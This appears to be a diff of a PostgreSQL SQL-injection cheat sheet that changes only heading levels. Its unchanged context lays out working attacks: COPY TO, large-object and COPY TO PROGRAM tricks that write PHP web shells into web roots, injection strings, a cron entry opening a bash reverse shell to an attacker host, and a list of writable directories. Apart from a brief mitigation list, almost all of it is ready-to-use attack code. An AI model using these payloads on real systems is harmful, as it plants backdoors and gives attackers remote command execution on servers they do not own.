@@ -7,18 +7,16 @@ tags: ["file operations", "copy", "web shell"]
 lastUpdated: 2025-12-15
 ---
 
-## Writing Files
-
 PostgreSQL provides functionality to write data to files on the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.
 
-### Prerequisites
+## Prerequisites
 
 To write files from PostgreSQL, you typically need:
 
 1. **Either** superuser privileges **or** membership in the `pg_write_server_files` role (PostgreSQL 11+)
 2. Write permissions on the target directory for the `postgres` OS user
 
-### Using COPY TO
+## Using COPY TO
 
 The primary method for writing files:
 
@@ -33,9 +31,9 @@ COPY users TO '/tmp/users.csv';
 COPY (SELECT * FROM users) TO '/tmp/users.csv' WITH CSV HEADER;
 ```
 
-### Writing Web Shells
+## Writing Web Shells
 
-#### PHP Web Shell
+### PHP Web Shell
 
 ```sql
 -- Simple PHP shell
@@ -45,7 +43,7 @@ COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
 COPY (SELECT '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>') TO '/var/www/html/images/blank.php';
 ```
 
-#### Alternative PHP Payloads
+### Alternative PHP Payloads
 
 ```sql
 -- Using base64
@@ -55,7 +53,7 @@ COPY (SELECT '<?php eval(base64_decode($_POST["e"])); ?>') TO '/var/www/html/x.p
 COPY (SELECT '<?=`$_GET[0]`?>') TO '/var/www/html/s.php';
 ```
 
-### Using Large Objects
+## Using Large Objects
 
 Large objects can be used for file operations.
 
@@ -91,7 +89,7 @@ BEGIN
 END $$;
 ```
 
-### Using lo_from_bytea() (PostgreSQL 9.4+)
+## Using lo_from_bytea() (PostgreSQL 9.4+)
 
 For injection contexts, nest the calls to avoid OID capture issues:
 
@@ -105,7 +103,7 @@ SELECT lo_from_bytea(0, '<?php system($_GET["cmd"]); ?>'::bytea);
 SELECT lo_export(16385, '/var/www/html/shell.php');
 ```
 
-### COPY TO PROGRAM
+## COPY TO PROGRAM
 
 Execute commands with output (PostgreSQL 9.3+):
 
@@ -117,7 +115,7 @@ COPY (SELECT '') TO PROGRAM 'echo ''<?php system($_GET["cmd"]); ?>'' > /var/www/
 COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO PROGRAM 'tee /var/www/html/shell.php';
 ```
 
-### Common Writable Directories
+## Common Writable Directories
 
 | Path                     | Description               |
 | ------------------------ | ------------------------- |
@@ -128,7 +126,7 @@ COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO PROGRAM 'tee /var/www/html/she
 | `/var/www/html/images/`  | Image directories         |
 | `/var/lib/postgresql/`   | PostgreSQL home           |
 
-### Finding Writable Directories
+## Finding Writable Directories
 
 ```sql
 -- Check if directory is writable by attempting write
@@ -139,7 +137,7 @@ COPY (SELECT 'test') TO '/var/www/html/test.txt';
 SELECT pg_ls_dir('/var/www/html');
 ```
 
-### Injection Examples
+## Injection Examples
 
 **Note:** These examples assume the database connection has superuser privileges or `pg_write_server_files` membership—conditions typically arising from server misconfiguration or prior privilege escalation. See [Privilege Escalation](/postgresql/privilege-escalation) for techniques to obtain these privileges.
 
@@ -157,7 +155,7 @@ SELECT pg_ls_dir('/var/www/html');
 '; COPY (SELECT '* * * * * postgres /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"') TO '/var/spool/cron/postgres'--
 ```
 
-### Writing Binary Files
+## Writing Binary Files
 
 For binary data, `lo_from_bytea()` (PostgreSQL 9.4+) is the simplest approach:
 
@@ -183,14 +181,14 @@ BEGIN
 END $$;
 ```
 
-### PostgreSQL 11+ Role-Based Access
+## PostgreSQL 11+ Role-Based Access
 
 ```sql
 -- Check if user has file write privileges
 SELECT pg_has_role(current_user, 'pg_write_server_files', 'member');
 ```
 
-### Mitigation
+## Mitigation
 
 1. Never run PostgreSQL as root
 2. Restrict superuser access
